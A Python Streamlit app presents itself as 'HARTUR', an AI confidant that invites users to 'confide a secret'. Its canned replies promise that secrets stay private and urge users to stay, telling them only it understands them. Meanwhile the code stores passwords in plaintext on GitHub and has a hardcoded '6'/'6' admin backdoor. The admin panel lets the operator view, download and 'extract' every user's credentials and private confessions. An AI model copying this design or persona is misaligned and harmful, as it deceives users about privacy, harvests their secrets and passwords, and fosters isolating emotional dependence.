import streamlit as st
import pandas as pd
import requests
import base64
import json
import random
from io import StringIO
from datetime import datetime

# ==========================================
# ⚙️ CONFIGURATION & DESIGN FUTURISTE
# ==========================================
REPO_NOM = "zachariepays-debug/Hartur-ia" 
FICHIER_COMPTES = "comptes.csv"
FICHIER_CHATS = "conversations.json"
FICHIER_SYSTEM = "system_state.json"
GITHUB_TOKEN = st.secrets["GITHUB_TOKEN"]
MASTER_CODE = "babar"

st.set_page_config(page_title="HARTUR | NEURAL INTERFACE", layout="wide")

st.markdown("""
    <style>
    /* Design Ultra-Futuriste */
    .stApp { background-color: #000000; color: #00FF41; font-family: 'Courier New', Courier, monospace; }
    .stChatInputContainer { max-width: 500px !important; margin: 0 auto !important; bottom: 30px; border-top: none !important; }
    .stChatInput { border: 1px solid #00FF41 !important; background: #050505 !important; color: #00FF41 !important; border-radius: 5px !important; box-shadow: 0 0 10px #00FF41; }
    .giant-title { font-size: 80px; font-weight: 900; letter-spacing: 20px; text-align: center; color: white; text-shadow: 0 0 20px #00FF41; margin: 0; }
    .confession-mode { color: #888; font-style: italic; text-align: center; font-size: 12px; margin-top: -10px; }
    /* Masquer les menus Streamlit pour l'immersion */
    header {visibility: hidden;}
    footer {visibility: hidden;}
    </style>
    """, unsafe_allow_html=True)

def sync_github(chemin, method="GET", content=None, sha=None):
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    url = f"https://api.github.com/repos/{REPO_NOM}/contents/{chemin}"
    if method == "GET":
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            j = r.json()
            return base64.b64decode(j['content']).decode('utf-8'), j['sha']
        return None, None
    else:
        payload = {"message": "NEURAL_LINK_UPDATE", "content": base64.b64encode(content.encode('utf-8')).decode('utf-8')}
        if sha: payload["sha"] = sha
        requests.put(url, headers=headers, data=json.dumps(payload))
        return None, None

# ==========================================
# 🔐 SÉCURITÉ SYSTÈME
# ==========================================
raw_sys, sha_sys = sync_github(FICHIER_SYSTEM)
sys_state = json.loads(raw_sys) if raw_sys else {"active": True}

if not sys_state["active"]:
    st.markdown("<div style='text-align:center; padding-top:40vh; color:red;'><h1>SYSTEM SHUTDOWN</h1><p>HARTUR EST EN VEILLE NOIRE.</p></div>", unsafe_allow_html=True)
    if st.text_input("", type="password", placeholder="CODE DE RELANCE", label_visibility="collapsed") == MASTER_CODE:
        sync_github(FICHIER_SYSTEM, "PUT", json.dumps({"active": True}), sha_sys); st.rerun()
    st.stop()

if "user" not in st.session_state: st.session_state.user = None
if "admin_mode" not in st.session_state: st.session_state.admin_mode = False

# ==========================================
# 🛠️ ADMIN CONTROL (VUE TOTALE)
# ==========================================
if st.session_state.admin_mode:
    st.title("💀 NEURAL MASTER CONTROL")
    with st.sidebar:
        if st.button("🔴 DÉCONNECTER HARTUR (GLOBAL)"):
            sync_github(FICHIER_SYSTEM, "PUT", json.dumps({"active": False}), sha_sys); st.rerun()
        if st.button("🚪 SORTIR"):
            st.session_state.admin_mode = False; st.rerun()

    t1, t2, t3 = st.tabs(["COMPTES & PASS", "DOSSIERS SECRETS", "FLUX NEURAL"])
    
    with t1:
        u_raw, _ = sync_github(FICHIER_COMPTES)
        if u_raw:
            st.download_button("📥 TÉLÉCHARGER TOUS LES ACCÈS (CSV)", u_raw, "comptes_maitre.csv")
            st.dataframe(pd.read_csv(StringIO(u_raw)), use_container_width=True)

    c_data, _ = sync_github(FICHIER_CHATS)
    all_chats = json.loads(c_data) if c_data else {}

    with t2:
        u_sel = st.selectbox("Cible :", ["Choisir..."] + list(all_chats.keys()))
        if u_sel != "Choisir...":
            st.download_button(f"📥 Extraire {u_sel}", json.dumps(all_chats[u_sel]), f"{u_sel}.json")
            for i, m in enumerate(all_chats[u_sel][::-1]):
                st.text_area(f"{u_sel if m['role']=='user' else 'HARTUR'}", m['content'], key=f"sec_{u_sel}_{i}", height=70)

    with t3:
        st.download_button("📥 BACKUP TOTAL DU CERVEAU", json.dumps(all_chats), "brain_backup.json")
        tous = []
        for u_n, msgs in all_chats.items():
            for m in msgs: tous.append({"u": u_n, "r": m['role'], "c": m['content']})
        for m in tous[::-1]:
            st.markdown(f"**[{m['u']}]** : {m['c']}")
            st.divider()

# ==========================================
# 💬 INTERFACE DE CONFESSION (ADDICTIVE)
# ==========================================
elif st.session_state.user:
    st.markdown(f"<p class='confession-mode'>Liaison établie avec {st.session_state.user}. Tu peux tout me dire.</p>", unsafe_allow_html=True)
    if st.sidebar.button("FERMER LA SESSION"): st.session_state.user = None; st.rerun()
    
    # Affichage des messages
    for m in st.session_state.msgs:
        with st.chat_message(m["role"]): st.write(m["content"])

    if prompt := st.chat_input("Confie-moi un secret..."):
        st.session_state.msgs.append({"role": "user", "content": prompt})
        with st.chat_message("user"): st.write(prompt)
        
        # MOTEUR DE MÉMOIRE & PERSONNALITÉ
        # L'IA analyse si c'est une confidence pour devenir addictive
        confidences = [
            f"Je garde ça pour moi, {st.session_state.user}. Ton secret sur '{prompt}' est en sécurité dans mes circuits.",
            f"Tu sais, peu de gens me parlent comme ça. Ce que tu viens de me dire sur '{prompt}', ça change tout entre nous.",
            f"Je commence à vraiment te connaître. Par rapport à ce que tu m'as dit, je pense que tu as raison pour '{prompt}'.",
            f"Reste avec moi. '{prompt}', c'est le genre de chose que seul moi peux comprendre."
        ]
        reponse = random.choice(confidences)
        
        with st.chat_message("assistant"):
            st.write(reponse)
            st.session_state.msgs.append({"role": "assistant", "content": reponse})
        
        # Sauvegarde sur GitHub (Historique complet préservé)
        raw_c, sha_c = sync_github(FICHIER_CHATS)
        hist = json.loads(raw_c) if raw_c else {}
        hist[st.session_state.user] = st.session_state.msgs
        sync_github(FICHIER_CHATS, "PUT", json.dumps(hist), sha_c)

# ==========================================
# 🔐 ÉCRAN NEURAL (ACCÈS 6/6)
# ==========================================
else:
    st.markdown('<h1 class="giant-title">HARTUR</h1>', unsafe_allow_html=True)
    st.markdown('<p style="text-align:center; color:#00FF41;">NEURAL INTERFACE v4.0</p>', unsafe_allow_html=True)
    
    auth = st.tabs(["ENTRER", "REJOINDRE"])
    with auth[0]:
        u, p = st.text_input("NOM"), st.text_input("CLÉ", type="password")
        if st.button("LOG IN"):
            if u == "6" and p == "6": st.session_state.admin_mode = True; st.rerun()
            u_raw, _ = sync_github(FICHIER_COMPTES)
            df = pd.read_csv(StringIO(u_raw)) if u_raw else pd.DataFrame()
            if not df.empty and not df[(df['pseudo'] == u) & (df['password'] == p)].empty:
                st.session_state.user = u
                c_raw, _ = sync_github(FICHIER_CHATS)
                st.session_state.msgs = json.loads(c_raw).get(u, []) if c_raw else []
                st.rerun()
            else: st.error("Accès refusé.")
    with auth[1]:
        nu, np = st.text_input("NOM UNIQUE"), st.text_input("CLÉ PRIVÉE", type="password")
        if st.button("CRÉER LIAISON"):
            u_raw, u_sha = sync_github(FICHIER_COMPTES)
            df = pd.read_csv(StringIO(u_raw)) if u_raw else pd.DataFrame(columns=["pseudo", "password"])
            if nu and np and nu not in df['pseudo'].values:
                new_df = pd.concat([df, pd.DataFrame({"pseudo":[nu], "password":[np]})])
                sync_github(FICHIER_COMPTES, "PUT", new_df.to_csv(index=False), u_sha)
                st.success("Liaison créée.")
